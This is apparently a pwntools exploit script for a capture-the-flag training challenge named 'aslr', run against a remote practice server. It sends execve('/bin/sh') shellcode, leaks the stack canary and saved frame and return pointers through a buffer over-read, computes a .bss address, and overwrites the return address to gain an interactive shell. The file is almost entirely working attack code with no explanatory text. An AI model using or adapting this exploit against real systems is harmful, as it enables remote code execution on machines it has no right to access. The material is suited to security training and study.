import pwn

pwn.context.terminal = ['gnome-terminal', '-e']
pwn.context.arch = 'amd64'

r = pwn.remote('training.jinblack.it', 2012)


# r = pwn.process('./aslr')

# pwn.gdb.attach(r, """
#     c

# """)

input('wait')

buffer_len = 104

shell_code = pwn.asm('''
    jmp end
    start:
    pop rdi
    mov rax, 0x3b
    lea rsi, [rdi + 0x7]
    mov rdx, rsi
    syscall
    end:
    call start
''') + b'/bin/sh' + b'\x00' * 8

r.send(shell_code)

pwn.sleep(0.1)

ADDRESS_SIZE = 8

class Leaker:
    last_offset = 0

    def leak_at_offset(self, offset, size):
        if offset > 200:
            raise RuntimeError('cannot write that many bytes (read only accepts 200)')
        if offset < 0:
            raise RuntimeError('cannot leak adresses below the buffer')
        if offset < self.last_offset:
            raise RuntimeError('cannot leak an address below a previously leaked address (it is already overwritten).')

        if size == 0:
            return b''

        self.last_offset = offset
        filler_until_desired_address = b'A' * offset
        r.send(filler_until_desired_address)
        pwn.sleep(0.1)
        r.recvuntil(b'> ')
        r.recv(len(filler_until_desired_address))
        content_at_address = r.recv(size, timeout=0.01)
        r.clean()
        bytes_leaked = len(content_at_address)
        if bytes_leaked == 0:
            return b'\x00' + self.leak_at_offset(offset + 1, size - 1)
        elif bytes_leaked < size:
            return content_at_address + self.leak_at_offset(offset + bytes_leaked, size - bytes_leaked)
        else:
            return content_at_address
    
leaker = Leaker()


canary = leaker.leak_at_offset(buffer_len, ADDRESS_SIZE)
ebp = leaker.leak_at_offset(buffer_len + ADDRESS_SIZE, ADDRESS_SIZE)
eip = leaker.leak_at_offset(buffer_len + ADDRESS_SIZE * 2, ADDRESS_SIZE)

print('canary')
print(hex(pwn.u64(canary)))
print('ebp')
print(hex(pwn.u64(ebp)))
print('eip')
print(hex(pwn.u64(eip)))

offset_from_ebp_to_bss_buffer = 0x2005c0
bss_buffer_address = pwn.u64(ebp) + offset_from_ebp_to_bss_buffer

print('bss buffer address:')
print(hex(bss_buffer_address))

print('sending exploit')

r.send(b'A' * buffer_len + canary + b'\x90' * 8  + pwn.p64(bss_buffer_address))

pwn.sleep(0.1)

r.interactive()